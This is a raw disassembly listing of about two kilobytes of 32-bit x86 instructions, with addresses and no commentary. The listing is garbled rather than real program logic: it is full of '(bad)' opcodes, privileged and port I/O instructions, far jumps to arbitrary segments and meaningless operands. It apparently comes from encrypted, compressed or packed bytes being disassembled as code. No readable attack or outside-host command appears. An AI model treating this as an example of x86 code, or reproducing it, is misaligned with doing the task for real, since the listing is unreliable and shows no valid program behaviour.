  413c52:	lods   eax,DWORD PTR ds:[esi]
  413c53:	xchg   ebx,eax
  413c54:	cmp    ebp,DWORD PTR [esi+0x749192a1]
  413c5a:	push   edx
  413c5b:	mov    ds:0xdb8d91d7,eax
  413c60:	sub    al,0xba
  413c62:	outs   dx,DWORD PTR ds:[esi]
  413c63:	retf   0x2d68
  413c66:	lds    edi,FWORD PTR ds:0xc3fb113f
  413c6c:	arpl   WORD PTR [ebx+0x49],cx
  413c6f:	rcl    BYTE PTR [ecx],0x15
  413c72:	(bad)  
  413c73:	jecxz  0x413c9c
  413c75:	shl    DWORD PTR [eax-0x23271605],1
  413c7b:	pop    ss
  413c7c:	cli    
  413c7d:	sar    BYTE PTR [ebx-0x574cf64f],0x8e
  413c84:	sbb    edx,esi
  413c86:	loope  0x413c44
  413c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c89:	inc    eax
  413c8a:	icebp  
  413c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c8c:	in     eax,dx
  413c8d:	sub    cl,BYTE PTR [eax]
  413c8f:	lods   eax,DWORD PTR ds:[esi]
  413c90:	loop   0x413cdf
  413c92:	fnstenv [edi]
  413c94:	pop    ecx
  413c95:	pop    ecx
  413c96:	popf   
  413c97:	arpl   WORD PTR [edi-0x74fc1109],dx
  413c9d:	dec    esp
  413c9e:	mov    ds:0xf4cb9c53,eax
  413ca3:	lds    eax,FWORD PTR [ebx-0x78c06d0c]
  413ca9:	andps  xmm4,xmm1
  413cac:	add    DWORD PTR [edx+0x6c],esi
  413caf:	cmc    
  413cb0:	lods   eax,DWORD PTR ds:[esi]
  413cb1:	imul   DWORD PTR [esi-0x63]
  413cb4:	mov    esp,0xce3982ba
  413cb9:	repnz cmp BYTE PTR [edx-0x63],dh
  413cbd:	repnz adc DWORD PTR ds:[ecx+eax*8-0x62194dc2],ebp
  413cc6:	lahf   
  413cc7:	mov    eax,0x6a65a52a
  413ccc:	inc    edi
  413ccd:	adc    eax,0x39788ca1
  413cd2:	sub    al,0x4a
  413cd4:	jl     0x413d4c
  413cd6:	mov    esi,DWORD PTR [edi]
  413cd8:	mov    ebp,0xbf232f7
  413cdd:	push   ecx
  413cde:	xor    BYTE PTR [eax-0x25b6a0ab],dl
  413ce4:	adc    al,0x4b
  413ce6:	cld    
  413ce7:	xchg   DWORD PTR [esi+edi*2+0x2f],ebx
  413ceb:	xchg   esp,eax
  413cec:	stos   BYTE PTR es:[edi],al
  413ced:	or     eax,0xfb189202
  413cf2:	sbb    al,0xfe
  413cf4:	mov    WORD PTR [ecx-0x5e],?
  413cf7:	jo     0x413d6d
  413cf9:	ds scas eax,DWORD PTR es:[edi]
  413cfb:	or     edx,ebx
  413cfd:	inc    ecx
  413cfe:	int3   
  413cff:	pop    edx
  413d00:	cmc    
  413d01:	dec    edx
  413d02:	dec    BYTE PTR [ebp-0x76]
  413d05:	add    eax,0xf490047
  413d0a:	(bad)  
  413d0b:	jb     0x413d00
  413d0d:	in     ax,dx
  413d0f:	fcomp  DWORD PTR [ebp-0x5f56f317]
  413d15:	inc    edx
  413d16:	inc    eax
  413d17:	mov    ebp,0x1ebe7d87
  413d1c:	pop    es
  413d1d:	icebp  
  413d1e:	scas   eax,DWORD PTR es:[edi]
  413d1f:	adc    al,bh
  413d21:	push   eax
  413d22:	sub    eax,0xccf0722f
  413d27:	mov    eax,ds:0x7f17ef4f
  413d2c:	sub    cl,BYTE PTR [edx]
  413d2e:	inc    esi
  413d2f:	and    BYTE PTR [edx],bl
  413d31:	jns    0x413d88
  413d33:	inc    ebp
  413d34:	rol    BYTE PTR [esi+0x67],0xfd
  413d38:	xchg   DWORD PTR [esi+0x1646b279],ebx
  413d3e:	sti    
  413d3f:	aam    0x92
  413d41:	sbb    esp,edi
  413d43:	stos   DWORD PTR es:[edi],eax
  413d44:	push   esi
  413d45:	jo     0x413d9d
  413d47:	jbe    0x413d5f
  413d49:	outs   dx,BYTE PTR ds:[esi]
  413d4a:	clc    
  413d4b:	sahf   
  413d4c:	lock lea esp,[edi-0x1c046f90]
  413d53:	into   
  413d54:	cs mov edx,0xad4b8761
  413d5a:	sub    eax,0xd268acda
  413d5f:	jno    0x413d7c
  413d61:	retf   
  413d62:	push   cs
  413d63:	mov    al,0x8a
  413d65:	xor    al,0x43
  413d67:	repnz scas al,BYTE PTR es:[edi]
  413d69:	xor    al,0xad
  413d6b:	push   es
  413d6c:	push   eax
  413d6d:	inc    ebp
  413d6e:	and    ah,BYTE PTR [esi+0x2]
  413d71:	clc    
  413d72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d73:	sti    
  413d74:	sti    
  413d75:	ins    BYTE PTR es:[edi],dx
  413d76:	mov    DWORD PTR [ebp+0x32],0xfa2ae755
  413d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d7e:	or     BYTE PTR [edx],cl
  413d80:	pop    ebp
  413d81:	and    al,0x5b
  413d83:	and    ecx,DWORD PTR [ecx-0x2b]
  413d86:	fiadd  WORD PTR [ebp-0x6c]
  413d89:	dec    edi
  413d8a:	xchg   ecx,eax
  413d8b:	or     ebx,edx
  413d8d:	enter  0x8242,0x97
  413d91:	rcr    BYTE PTR [ecx],0xb8
  413d94:	fsubp  st(5),st
  413d96:	mov    eax,0x23cc7a3d
  413d9b:	stos   BYTE PTR es:[edi],al
  413d9c:	dec    ebx
  413d9d:	(bad)  
  413d9e:	aam    0xf6
  413da0:	mov    esi,0x5f26ee1c
  413da5:	xor    dh,BYTE PTR [ebp+0x413ab0d8]
  413dab:	sub    al,BYTE PTR [edi+0x71]
  413dae:	jle    0x413dca
  413db0:	out    0xd8,eax
  413db2:	cmp    DWORD PTR [eax+0x6d98021c],edx
  413db8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413db9:	xchg   DWORD PTR [edi-0x23],esi
  413dbc:	pusha  
  413dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dbe:	pop    ss
  413dbf:	ja     0x413dfe
  413dc1:	mov    WORD PTR [eax+eax*1-0x2d],ds
  413dc5:	push   edi
  413dc6:	shl    bl,cl
  413dc8:	scas   eax,DWORD PTR es:[edi]
  413dc9:	add    DWORD PTR [eax+0x6d020ef8],edx
  413dcf:	sub    dl,BYTE PTR [edx-0x20ffc47a]
  413dd5:	in     eax,0xff
  413dd7:	inc    edi
  413dd8:	dec    ebx
  413dd9:	nop
  413dda:	add    bl,dh
  413ddc:	push   cs
  413ddd:	(bad)  
  413dde:	repnz push esi
  413de0:	dec    ebp
  413de1:	mov    ds:0x3a49762c,eax
  413de6:	loopne 0x413d6d
  413de8:	sub    eax,0xaf0dbc85
  413ded:	sub    DWORD PTR [edx-0x3d],0xea2c9f66
  413df4:	(bad)  
  413df5:	xchg   edi,eax
  413df6:	jns    0x413e42
  413df8:	push   cs
  413df9:	cmp    edi,edx
  413dfb:	mov    eax,ds:0xf98d44cc
  413e00:	imul   ebx,DWORD PTR [edx],0x76c9b71d
  413e06:	enter  0x58c5,0x45
  413e0a:	dec    edx
  413e0b:	or     al,bh
  413e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e0e:	(bad)  
  413e0f:	fnstsw WORD PTR [ebp-0x72]
  413e12:	sub    DWORD PTR [ecx-0xa],ebx
  413e15:	sbb    esi,DWORD PTR [ecx]
  413e17:	or     BYTE PTR [ebx-0x764c29cf],dl
  413e1d:	rol    BYTE PTR [ebx+0x19],1
  413e20:	and    esp,DWORD PTR [edi-0x2739f49a]
  413e26:	adc    ecx,DWORD PTR [esi-0x55]
  413e29:	jno    0x413de4
  413e2b:	mov    eax,ds:0xa51e3469
  413e30:	test   BYTE PTR [edi+0x76],cl
  413e33:	push   esp
  413e34:	dec    eax
  413e35:	mov    cs:0xfdcb2c86,eax
  413e3b:	cs push esp
  413e3d:	in     al,0x77
  413e3f:	pop    ds
  413e40:	inc    ebp
  413e41:	jne    0x413dd6
  413e43:	jb     0x413ddb
  413e45:	mov    al,ds:0xee886bc7
  413e4a:	and    DWORD PTR [ebx-0x1e74d4ef],eax
  413e50:	inc    esp
  413e51:	stc    
  413e52:	mov    edx,0x9ac389e7
  413e57:	cdq    
  413e58:	in     eax,0xed
  413e5a:	push   edx
  413e5b:	das    
  413e5c:	mov    dh,0x50
  413e5e:	bound  eax,QWORD PTR [esp+eax*4+0x18abb678]
  413e65:	dec    edx
  413e66:	xchg   BYTE PTR [edi],bl
  413e68:	adc    eax,DWORD PTR [edx-0x7a]
  413e6b:	add    DWORD PTR [ebx+0x1a0d4d2a],esp
  413e71:	int    0xc6
  413e73:	mov    ebx,0xcbd1a935
  413e78:	das    
  413e79:	xchg   ecx,eax
  413e7a:	(bad)  
  413e7b:	ror    DWORD PTR [eax+0x1d],1
  413e7e:	cmc    
  413e7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e80:	push   edx
  413e81:	and    dh,BYTE PTR [ebp-0x5d]
  413e84:	and    DWORD PTR [esi-0x1b6d2977],esi
  413e8a:	adc    ch,BYTE PTR [ebx+0x1b]
  413e8d:	mov    ch,0xc
  413e8f:	fs ins BYTE PTR es:[edi],dx
  413e91:	fsubp  st(4),st
  413e93:	fwait
  413e94:	adc    al,0xdf
  413e96:	sbb    eax,0x3d71a701
  413e9b:	mov    esi,0x52e43a85
  413ea0:	push   0x78
  413ea2:	fild   WORD PTR [esi]
  413ea4:	arpl   WORD PTR [ebx-0x70f93d57],dx
  413eaa:	fs inc ebx
  413eac:	scas   eax,DWORD PTR es:[edi]
  413ead:	jp     0x413f1c
  413eaf:	cmp    al,0x26
  413eb1:	mov    al,ds:0x7e08833c
  413eb6:	add    DWORD PTR [ecx],edx
  413eb8:	jmp    0x8d2f:0x8033ab0b
  413ebf:	lods   eax,DWORD PTR ds:[esi]
  413ec0:	push   edx
  413ec1:	push   DWORD PTR [ecx+0xa]
  413ec4:	jge    0x413eb3
  413ec6:	mov    bl,0x1d
  413ec8:	mov    ecx,0xb3a2937
  413ecd:	cmp    esi,eax
  413ecf:	sbb    dl,BYTE PTR [esi-0xb]
  413ed2:	pop    ebx
  413ed3:	scas   eax,DWORD PTR es:[edi]
  413ed4:	cmp    al,0x84
  413ed6:	out    dx,al
  413ed7:	leave  
  413ed8:	ficomp DWORD PTR ds:0x4db2870f
  413ede:	(bad)  
  413edf:	stos   BYTE PTR es:[edi],al
  413ee0:	mov    ebp,0x9e761cc9
  413ee5:	and    edi,edi
  413ee7:	mov    esi,0xb411315c
  413eec:	fsubr  st,st(7)
  413eee:	sub    eax,0x6184a7d6
  413ef3:	ret    
  413ef4:	adc    eax,0x9ff9d91d
  413ef9:	cli    
  413efa:	shl    bh,0x88
  413efd:	fcmovbe st,st(6)
  413eff:	mov    BYTE PTR [eax],bh
  413f01:	push   0x58
  413f03:	xor    edx,DWORD PTR [ecx]
  413f05:	mov    gs,edx
  413f07:	xchg   edx,eax
  413f08:	cld    
  413f09:	or     DWORD PTR [ebx-0x6e84921],ecx
  413f0f:	call   0x2a3:0x4e84b241
  413f16:	sti    
  413f17:	push   ecx
  413f18:	popa   
  413f19:	sbb    DWORD PTR [edx+edi*2],0xf45c5e19
  413f20:	ja     0x413f2b
  413f22:	mov    eax,ds:0xfe21a0f8
  413f27:	adc    bh,bh
  413f29:	jg     0x413ef9
  413f2b:	mov    ebx,0x6bec35c4
  413f30:	arpl   cx,si
  413f32:	data16 sbb BYTE PTR [esi],bh
  413f35:	mov    edi,0xc8a9e9cf
  413f3a:	fidiv  WORD PTR [edx+edi*8+0x16]
  413f3e:	mov    DWORD PTR [eax+0x52],eax
  413f41:	mov    ch,0x21
  413f43:	out    dx,eax
  413f44:	mov    dh,0x36
  413f46:	pop    edx
  413f47:	jmp    0xcb929d94
  413f4c:	mov    eax,ds:0x87b65e5a
  413f51:	pop    eax
  413f52:	test   DWORD PTR [eax+ebx*8],edx
  413f55:	pop    esp
  413f56:	pop    eax
  413f57:	mov    esp,0x3d8656d
  413f5c:	les    edx,FWORD PTR [eax-0x67]
  413f5f:	mul    DWORD PTR [esi-0x6c]
  413f62:	retf   
  413f63:	push   cs
  413f64:	leave  
  413f65:	and    al,0x8d
  413f67:	pop    ebx
  413f68:	or     eax,0x5857ba26
  413f6d:	out    dx,eax
  413f6e:	js     0x413fdf
  413f70:	adc    BYTE PTR [ebx+esi*4],dh
  413f73:	mov    dh,0xe5
  413f75:	daa    
  413f76:	out    0x28,eax
  413f78:	in     al,dx
  413f79:	hlt    
  413f7a:	or     esp,edi
  413f7c:	cdq    
  413f7d:	or     eax,DWORD PTR [ecx+edx*8]
  413f80:	and    esi,DWORD PTR [eax]
  413f82:	fist   WORD PTR [ebx+0x13]
  413f85:	xor    dl,BYTE PTR [eax-0x4d95460d]
  413f8b:	adc    DWORD PTR [edx],esp
  413f8d:	inc    ebx
  413f8e:	ds jle 0x413fb8
  413f91:	sbb    ebx,0xbeae449d
  413f97:	jl     0x413fd7
  413f99:	and    dl,0x2b
  413f9c:	icebp  
  413f9d:	std    
  413f9e:	adc    al,0xbe
  413fa0:	jae    0x413f77
  413fa2:	aam    0x53
  413fa4:	or     bh,BYTE PTR [edi+eiz*1]
  413fa7:	jmp    0x413f29
  413fa9:	adc    eax,0xf1e576a3
  413fae:	xchg   ebx,eax
  413faf:	add    edi,edx
  413fb1:	xor    eax,0x2f92cf3b
  413fb6:	das    
  413fb7:	(bad)  
  413fb9:	fldcw  WORD PTR [esi]
  413fbb:	jg     0x413f40
  413fbd:	in     al,dx
  413fbe:	inc    esi
  413fbf:	xchg   DWORD PTR [ebx-0x7d],esi
  413fc2:	and    DWORD PTR [edx-0x33],esp
  413fc5:	push   eax
  413fc6:	dec    edx
  413fc7:	fdivrp st(4),st
  413fc9:	addr16 (bad) 
  413fcb:	test   eax,0x74496bdd
  413fd0:	mov    eax,ds:0x411e2ee7
  413fd5:	jmp    0x97db:0x5e55732
  413fdc:	js     0x413f6c
  413fde:	ds out dx,al
  413fe0:	cmp    eax,0xc165739d
  413fe5:	pop    ss
  413fe6:	fild   QWORD PTR [ebp-0x5a]
  413fe9:	leave  
  413fea:	retf   0x2883
  413fed:	xor    DWORD PTR [ebp+0x78],ecx
  413ff0:	ins    DWORD PTR es:[edi],dx
  413ff1:	stc    
  413ff2:	mov    ecx,0xf512c27b
  413ff7:	jmp    0x414064
  413ff9:	jecxz  0x414076
  413ffb:	pop    ebp
  413ffc:	imul   esp,DWORD PTR [ebp-0x79],0x7b
  414000:	inc    esp
  414001:	cmp    BYTE PTR [edx+edi*4],al
  414004:	jae    0x414003
  414006:	into   
  414007:	adc    al,0xbc
  414009:	(bad)  
  41400a:	jns    0x41402b
  41400c:	fcomp  st(4)
  41400e:	lea    esp,[ecx]
  414010:	retf   0xf61f
  414013:	iret   
  414014:	gs test al,ch
  414017:	push   esp
  414018:	xor    al,0x53
  41401a:	mov    eax,ds:0x39634f8d
  41401f:	jae    0x414017
  414021:	(bad)  
  414022:	and    eax,0x82920c57
  414027:	lahf   
  414028:	gs mov dl,0x8c
  41402b:	(bad)  
  41402d:	push   es
  41402e:	ins    DWORD PTR es:[edi],dx
  41402f:	hlt    
  414030:	jg     0x4140a0
  414032:	inc    ebp
  414033:	inc    esi
  414034:	call   0x9ec15ce
  414039:	in     eax,dx
  41403a:	fcom   DWORD PTR [ebx+eiz*8]
  41403d:	mov    gs,WORD PTR [ebx]
  41403f:	shr    DWORD PTR [ebx],1
  414041:	in     al,0xc5
  414043:	sub    eax,0x1086a7e
  414048:	or     al,0x15
  41404a:	xchg   esp,eax
  41404b:	fst    st(6)
  41404d:	mov    dl,0x39
  41404f:	aaa    
  414050:	scas   al,BYTE PTR es:[edi]
  414051:	jl     0x4140c1
  414053:	int3   
  414054:	repnz enter 0xf67c,0x98
  414059:	ret    
  41405a:	popf   
  41405b:	into   
  41405c:	adc    eax,0x50385ed2
  414061:	aad    0xea
  414063:	mov    dl,0xf0
  414065:	push   edi
  414066:	repz push ebx
  414068:	jae    0x4140b8
  41406a:	sub    bh,BYTE PTR [edx+0x30255543]
  414070:	jno    0x413ffc
  414072:	inc    eax
  414073:	mov    ch,0x1c
  414075:	and    al,0xab
  414077:	arpl   WORD PTR [edi+0x6640b787],cx
  41407d:	rep ins DWORD PTR es:[edi],dx
  41407f:	dec    eax
  414080:	push   esp
  414081:	dec    DWORD PTR [esi]
  414083:	jne    0x414043
  414085:	jle    0x4140b0
  414087:	ins    BYTE PTR es:[edi],dx
  414088:	inc    esp
  414089:	jl     0x41404f
  41408b:	repz (bad) 
  41408d:	and    al,0x54
  41408f:	fcom   QWORD PTR [esi]
  414091:	es out dx,al
  414093:	stos   BYTE PTR es:[edi],al
  414094:	mov    BYTE PTR [ecx+0x78f1c8f6],0xcf
  41409b:	div    DWORD PTR [eax+0x61]
  41409e:	adc    bl,BYTE PTR [edx-0x5b]
  4140a1:	mov    ch,0x17
  4140a3:	out    0x78,al
  4140a5:	std    
  4140a6:	aas    
  4140a7:	add    bh,BYTE PTR [ebp-0x7b4319f2]
  4140ad:	sbb    BYTE PTR ds:0x7d5393b3,cl
  4140b3:	pop    ecx
  4140b4:	xchg   ecx,eax
  4140b5:	mov    ds:0xce1c2d0f,eax
  4140ba:	xor    dl,BYTE PTR [eax]
  4140bc:	ins    DWORD PTR es:[edi],dx
  4140bd:	fmul   DWORD PTR [esi]
  4140bf:	aas    
  4140c0:	mul    BYTE PTR [ecx]
  4140c2:	sbb    bl,BYTE PTR ds:0x81c47bc2
  4140c8:	mov    al,0x71
  4140ca:	(bad)  
  4140cb:	fs mov dl,0x57
  4140ce:	in     eax,0x59
  4140d0:	(bad)  
  4140d1:	into   
  4140d2:	jge    0x4140ab
  4140d4:	fdiv   DWORD PTR [esi]
  4140d6:	mov    esi,0x3037c800
  4140db:	inc    esi
  4140dc:	aaa    
  4140dd:	pop    ebx
  4140de:	sbb    al,0x70
  4140e0:	cld    
  4140e1:	mov    esp,0x787b51dd
  4140e6:	jle    0x41412d
  4140e8:	cmp    cl,BYTE PTR [ebx]
  4140ea:	xchg   esi,eax
  4140eb:	sub    bh,bl
  4140ed:	xchg   edx,eax
  4140ee:	clc    
  4140ef:	sar    DWORD PTR [eax+0x4ec2500f],0xc
  4140f6:	mov    ch,0x5a
  4140f8:	sbb    BYTE PTR [ebp-0x2c],ah
  4140fb:	jl     0x4140f0
  4140fd:	or     eax,DWORD PTR [ebp+eax*2+0x4f]
  414101:	outs   dx,DWORD PTR ds:[esi]
  414102:	push   ecx
  414103:	xchg   ebp,eax
  414104:	out    dx,al
  414105:	or     eax,0xfb9fca46
  41410a:	mov    DWORD PTR [ecx-0x2c],ebp
  41410d:	adc    BYTE PTR [ebp-0x620be147],dl
  414113:	cmp    edx,DWORD PTR [ecx+ebx*4]
  414116:	lods   al,BYTE PTR ds:[esi]
  414117:	dec    ebp
  414118:	test   eax,0x324af88e
  41411d:	or     DWORD PTR [ebx+ecx*4-0x2096885f],ebx
  414124:	mov    ds:0x60d258c0,al
  414129:	inc    edx
  41412a:	shl    DWORD PTR ds:0x3a26e6b4,cl
  414130:	pop    ds
  414131:	mov    DWORD PTR [esi+0x7],ebp
  414134:	pop    esp
  414135:	xchg   BYTE PTR [eax+0x22],al
  414138:	mov    esi,0xbed45b4a
  41413d:	sub    DWORD PTR [ecx+esi*1+0x38],ebp
  414141:	jmp    0x662b8619
  414146:	pop    esi
  414147:	into   
  414148:	rcr    DWORD PTR [esi+0xcb8e975],0xef
  41414f:	retf   
  414150:	sti    
  414151:	or     ch,dh
  414153:	adc    DWORD PTR [edi],ebx
  414155:	jle    0x41417b
  414157:	add    eax,DWORD PTR [eax-0x52f222ec]
  41415d:	inc    ebx
  41415e:	jp     0x41410d
  414160:	or     dl,ch
  414162:	loope  0x4141d9
  414164:	test   DWORD PTR [esi+0x64],edi
  414167:	scas   al,BYTE PTR es:[edi]
  414168:	loope  0x4141d3
  41416a:	mov    ebx,0xfe822846
  41416f:	mov    BYTE PTR [ecx+0x6f],al
  414172:	arpl   WORD PTR [eax+0x7096e5f8],bx
  414178:	dec    ebp
  414179:	add    al,BYTE PTR [edi-0x4d7cdf92]
  41417f:	cmp    bh,BYTE PTR [ecx+esi*4]
  414182:	test   al,0xb
  414184:	mov    ch,0x74
  414186:	jae    0x414114
  414188:	inc    esp
  414189:	xor    al,0x71
  41418b:	call   ebp
  41418d:	in     eax,0x8c
  41418f:	xchg   BYTE PTR [ecx-0x2a],dl
  414192:	(bad)  
  414193:	out    dx,eax
  414194:	add    eax,0xa1e2782e
  414199:	in     al,0x39
  41419b:	das    
  41419c:	retf   
  41419d:	and    al,BYTE PTR [ebp-0x52051b0a]
  4141a3:	fs stos DWORD PTR es:[edi],eax
  4141a5:	rcl    DWORD PTR [ebx-0x7084717a],1
  4141ab:	jo     0x4141b3
  4141ad:	(bad)  
  4141ae:	or     al,0x94
  4141b0:	imul   edx,DWORD PTR [ecx],0xffffffd1
  4141b3:	push   ecx
  4141b4:	mov    esp,0xd6181fc8
  4141b9:	and    BYTE PTR [eax+0x7cd9bdb3],0xc8
  4141c0:	out    0xee,al
  4141c2:	sbb    al,0x9c
  4141c4:	mov    edx,0xc35b95d7
  4141c9:	sub    DWORD PTR [esi],edi
  4141cb:	jnp    0x4141e4
  4141cd:	in     eax,0x32
  4141cf:	mov    edx,0x74b3d696
  4141d4:	ins    BYTE PTR es:[edi],dx
  4141d5:	mov    ds:0x983fe5ca,eax
  4141da:	test   DWORD PTR [ebp+0x2e],ebp
  4141dd:	cld    
  4141de:	aad    0xe5
  4141e0:	sar    BYTE PTR cs:[ecx+0x42],cl
  4141e4:	push   esi
  4141e5:	mov    ah,0x68
  4141e7:	jne    0x4141ec
  4141e9:	cmc    
  4141ea:	scas   eax,DWORD PTR es:[edi]
  4141eb:	sbb    ah,BYTE PTR [ecx+eax*1]
  4141ee:	jp     0x4141b7
  4141f0:	sbb    esp,edx
  4141f2:	xlat   BYTE PTR ds:[ebx]
  4141f3:	pop    ebp
  4141f4:	xor    eax,0xf4224e93
  4141f9:	sti    
  4141fa:	data16 (bad) 
  4141fc:	fwait
  4141fd:	xchg   esi,eax
  4141fe:	fdiv   QWORD PTR [edi]
  414200:	daa    
  414201:	push   eax
  414202:	add    BYTE PTR [ecx+edi*1-0x25c412fc],0xb1
  41420a:	imul   ebp,DWORD PTR [eax+0x63],0xffffffdd
  41420e:	push   edx
  41420f:	sbb    eax,0xa96843c
  414214:	adc    esp,DWORD PTR [edx]
  414216:	push   ebp
  414217:	dec    esi
  414218:	in     al,dx
  414219:	sub    al,al
  41421b:	sbb    eax,0xe726edaa
  414220:	aam    0x52
  414222:	lea    edx,[ecx+0x1b]
  414225:	and    BYTE PTR [ebx+esi*2+0x5f],bl
  414229:	pop    ebp
  41422a:	loopne 0x41424f
  41422c:	fwait
  41422d:	hlt    
  41422e:	repnz lods eax,DWORD PTR ds:[esi]
  414230:	adc    esi,DWORD PTR [ebx+0x49]
  414233:	and    eax,0xed966bec
  414238:	jo     0x4141d1
  41423a:	loope  0x41422b
  41423c:	xchg   DWORD PTR [esi-0x61],ebp
  41423f:	inc    esp
  414240:	mov    dh,dh
  414242:	pushf  
  414243:	loopne 0x4141d2
  414245:	or     BYTE PTR [esi],dl
  414247:	mov    al,0x9d
  414249:	pop    edi
  41424a:	jle    0x414216
  41424c:	imul   esi,DWORD PTR [eax-0x3f],0x23
  414250:	jb     0x4141d3
  414252:	jne    0x414287
  414254:	sub    cl,dl
  414256:	mov    esp,0x4aeacd8b
  41425b:	mov    ebp,0x23c2d316
  414260:	jmp    0x4141f4
  414262:	ficom  WORD PTR [ecx-0x242df75a]
  414268:	hlt    
  414269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41426a:	and    ecx,DWORD PTR [ebx]
  41426c:	pop    eax
  41426d:	outs   dx,DWORD PTR ds:[esi]
  41426e:	(bad)  
  414270:	fcomp  QWORD PTR [ebx+0x24]
  414273:	out    dx,eax
  414274:	inc    eax
  414275:	stos   BYTE PTR es:[edi],al
  414276:	imul   DWORD PTR [edx+0x54]
  414279:	sbb    BYTE PTR [ecx-0x4cefec76],0xc1
  414280:	push   ebp
  414281:	pop    ebx
  414282:	jmp    0x414263
  414284:	mov    ds:0x670ab00e,eax
  414289:	loop   0x41421b
  41428b:	xlat   BYTE PTR ds:[ebx]
  41428c:	mov    ebp,0x84107148
  414291:	les    edi,FWORD PTR [ebp-0x7d]
  414294:	dec    BYTE PTR [edi]
  414296:	aad    0xce
  414298:	adc    al,0xa3
  41429a:	test   BYTE PTR [eax-0x54],0x44
  41429e:	sbb    BYTE PTR [ebp+0x18],bh
  4142a1:	add    DWORD PTR [ebx],0x3d
  4142a4:	mov    esp,0x3fd9b882
  4142a9:	(bad)  
  4142ab:	mov    esp,0x691821fd
  4142b1:	adc    dl,BYTE PTR [ebx+0x7e5f61eb]
  4142b7:	sub    ebp,DWORD PTR [eax]
  4142b9:	lods   al,BYTE PTR ds:[esi]
  4142ba:	jg     0x41433a
  4142bc:	dec    edi
  4142bd:	push   ebp
  4142be:	sbb    DWORD PTR [ecx-0x2],0xef62bf3a
  4142c5:	adc    DWORD PTR [edi-0x76],0xffffff9f
  4142c9:	mov    dh,0xab
  4142cb:	inc    DWORD PTR [ebp+0x7314e0d0]
  4142d1:	stos   DWORD PTR es:[edi],eax
  4142d2:	sbb    ebp,DWORD PTR [ebx]
  4142d4:	pop    edx
  4142d5:	cmp    BYTE PTR [edi],dl
  4142d7:	aam    0xd2
  4142d9:	(bad)  
  4142da:	and    ch,BYTE PTR [edi+0x3b]
  4142dd:	pop    es
  4142de:	xor    bh,BYTE PTR [esi+esi*8+0x6a]
  4142e2:	inc    esi
  4142e3:	fsubr  QWORD PTR [ebp+0x4c]
  4142e6:	dec    ecx
  4142e7:	fnsave [edi+esi*1+0x7f]
  4142eb:	cmp    cl,BYTE PTR [ebx+0x17]
  4142ee:	or     al,0x4f
  4142f0:	dec    ecx
  4142f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142f2:	aas    
  4142f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142f4:	push   ebx
  4142f5:	out    dx,eax
  4142f6:	scas   al,BYTE PTR es:[edi]
  4142f7:	adc    BYTE PTR [eax-0x64],bl
  4142fa:	pop    edx
  4142fb:	sti    
  4142fc:	dec    esp
  4142fd:	ror    DWORD PTR [eax+ebx*1-0x58e23bbd],1
  414304:	mov    bh,BYTE PTR [edx-0x2e]
  414307:	lock stos BYTE PTR es:[edi],al
  414309:	pop    eax
  41430a:	fucom  st(6)
  41430c:	nop
  41430d:	jle    0x414354
  41430f:	sbb    DWORD PTR [ebp+eiz*2-0x70],esp
  414313:	fcom   QWORD PTR [esi]
  414315:	shr    DWORD PTR [ecx+esi*4-0x338c0ca0],0x22
  41431d:	dec    eax
  41431e:	dec    edx
  41431f:	mov    ch,0xf2
  414321:	ret    
  414322:	ret    
  414323:	push   ebx
  414324:	inc    edi
  414325:	inc    esp
  414326:	paddsb mm5,QWORD PTR [edx]
  414329:	scas   eax,DWORD PTR es:[edi]
  41432a:	bound  ecx,QWORD PTR [eax-0x53]
  41432d:	push   edx
  41432e:	add    DWORD PTR [edi],ebx
  414330:	inc    edx
  414331:	test   eax,0x47080f67
  414336:	mov    ds:0x137f791,eax
  41433b:	bound  esp,QWORD PTR [edi-0x62]
  41433e:	stos   BYTE PTR es:[edi],al
  41433f:	popa   
  414340:	outs   dx,DWORD PTR ds:[esi]
  414341:	dec    edx
  414342:	ins    DWORD PTR es:[edi],dx
  414343:	les    ecx,FWORD PTR [edi+0x4]
  414346:	and    DWORD PTR [esi],ebx
  414348:	push   0x45b200bf
  41434d:	out    dx,eax
  41434e:	dec    eax
  41434f:	sub    al,0xe4
  414351:	scas   eax,DWORD PTR es:[edi]
  414352:	sub    eax,0x7690741b
  414357:	jecxz  0x41439f
  414359:	ror    BYTE PTR [esi-0x74f3e893],0xce
  414360:	sbb    BYTE PTR [eax+eiz*8+0x2cc33630],ch
  414367:	mov    DWORD PTR [esi-0x1cadbb53],ebx
  41436d:	inc    eax
  41436e:	es mov bh,0x19
  414371:	inc    eax
  414372:	and    BYTE PTR [edx+0x5d],ah
  414375:	lock rcl al,1
  414378:	test   al,0x75
  41437a:	les    edx,FWORD PTR [edi]
  41437c:	sar    DWORD PTR [ebp+0x22abea54],0x69
  414383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414384:	mov    eax,0xc16ccb7f
  414389:	cs sbb eax,0xb5405079
  41438f:	mov    al,0x41
  414391:	ins    BYTE PTR es:[edi],dx
  414392:	(bad)  
  414393:	mov    ch,al
  414395:	inc    esp
  414396:	inc    eax
  414397:	mov    ds:0xba4d85b4,eax
  41439c:	jae    0x414367
  41439e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41439f:	cmp    ah,BYTE PTR [ebp-0x59]
  4143a2:	das    
  4143a3:	push   edx
  4143a4:	stos   BYTE PTR es:[edi],al
  4143a5:	ficomp WORD PTR [edi-0x48b0780f]
  4143ab:	or     eax,0xacabf610
  4143b0:	jp     0x4143ef
  4143b2:	inc    esi
  4143b3:	xor    al,0xfc
  4143b5:	sbb    DWORD PTR [ebx-0x26],eax
  4143b8:	and    ah,bh
  4143ba:	xor    BYTE PTR [esi+ebx*2+0x78],ch
  4143be:	or     ch,BYTE PTR [ebx]
  4143c0:	sbb    eax,0xf27abd51
  4143c5:	bound  edx,QWORD PTR es:[edi-0x67371b3b]
  4143cc:	sti    
  4143cd:	cmp    al,0x34
  4143cf:	outs   dx,DWORD PTR ds:[esi]
